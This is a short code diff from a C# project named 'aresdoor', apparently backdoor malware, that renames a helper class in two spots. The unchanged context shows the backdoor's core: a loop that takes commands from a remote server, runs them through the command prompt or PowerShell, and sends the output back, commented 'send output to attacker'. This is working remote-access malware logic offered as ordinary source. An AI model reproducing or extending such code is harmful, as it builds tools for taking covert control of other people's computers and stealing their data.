@@ -25,7 +25,7 @@ namespace aresdoor
                 else if (responseFromServer.Contains("exit"))
                     return false;
                 else
-                    try { nc.dataTravelTO(stream, Misc.execCommandPrompt(responseFromServer)); } // Execute command and send output to attacker
+                    try { nc.dataTravelTO(stream, CommandShell.execCommandPrompt(responseFromServer)); } // Execute command and send output to attacker
                 #if DEBUG
                     catch (Exception exc) { Console.WriteLine(exc); return false; }
                 #else
@@ -50,7 +50,7 @@ namespace aresdoor
                 else if (responseFromServer.Contains("exit"))
                     return false;
                 else
-                    try { nc.dataTravelTO(stream, Misc.execPowershellCommand(responseFromServer)); } // Execute command and send output to attacker
+                    try { nc.dataTravelTO(stream, CommandShell.execPowershellCommand(responseFromServer)); } // Execute command and send output to attacker
                 #if DEBUG
                     catch (Exception exc) { Console.WriteLine(exc); return false; }
                 #else
